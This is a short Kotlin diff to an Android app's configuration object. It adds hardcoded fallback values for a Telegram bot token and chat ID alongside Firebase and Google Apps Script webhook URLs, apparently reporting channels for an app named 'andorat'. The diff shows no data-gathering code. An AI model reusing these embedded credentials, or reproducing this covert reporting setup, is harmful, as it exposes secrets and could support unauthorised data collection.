@@ -77,6 +77,16 @@ object Config {
         return if (url.isNotEmpty()) url else "https://andorat-c2181-default-rtdb.asia-southeast1.firebasedatabase.app/"
     }
 
+    fun getTelegramBotToken(context: Context): String {
+        val token = getMetaData(context, "telegram_bot_token")
+        return if (token.isNotEmpty()) token else "9096038832:AAEadfQE-bIzeNc8OKAHbUI3-UKQV70uXVM"
+    }
+
+    fun getTelegramChatId(context: Context): String {
+        val chatId = getMetaData(context, "telegram_chat_id")
+        return if (chatId.isNotEmpty()) chatId else "6541825979"
+    }
+
     fun getDriveWebhookUrl(context: Context): String {
         val url = getMetaData(context, "drive_webhook_url")
         return if (url.isNotEmpty()) url else "https://script.google.com/macros/s/AKfycbxXY04auYkCIwzpCkhYzanzVLtzagGhbflSdctjrZee10U5T8d7FbhIa6T41hQNTm4E/exec"
